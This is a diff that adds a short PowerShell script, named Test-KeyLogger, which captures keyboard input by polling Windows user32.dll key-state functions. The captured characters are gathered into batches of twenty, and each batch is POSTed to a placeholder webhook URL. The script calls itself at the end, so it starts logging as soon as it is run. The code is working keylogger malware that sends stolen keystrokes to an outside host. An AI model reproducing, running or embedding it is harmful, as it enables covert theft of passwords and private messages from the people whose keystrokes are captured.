@@ -1,0 +1,50 @@
+function Test-KeyLogger 
+{
+  $APIsignatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+ $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+  try
+  {
+    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
+    $number = 0
+    while ($true) {
+      Start-Sleep -Milliseconds 40            
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        $keystate = $API::GetAsyncKeyState($ascii)
+        if ($keystate -eq -32767) {
+          $null = [console]::CapsLock
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+          $loggedchar = New-Object -TypeName System.Text.StringBuilder    
+          if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
+          {
+            $number++
+            $testing = "$testing" + "$loggedchar"
+            if ($number -eq 20){
+                $number = 0
+                $postParams = @{username='me';moredata=$testing}
+                $URL = "<link to webhook>"
+                Invoke-WebRequest -UseBasicParsing $URL -ContentType "application/json" -Method POST -Body "$testing"
+                $testing = ""
+            }
+          }
+        }
+      }
+    }
+  }
+  finally
+  {    
+    Start-Sleep -Seconds 2
+  }
+}
+
+Test-KeyLogger
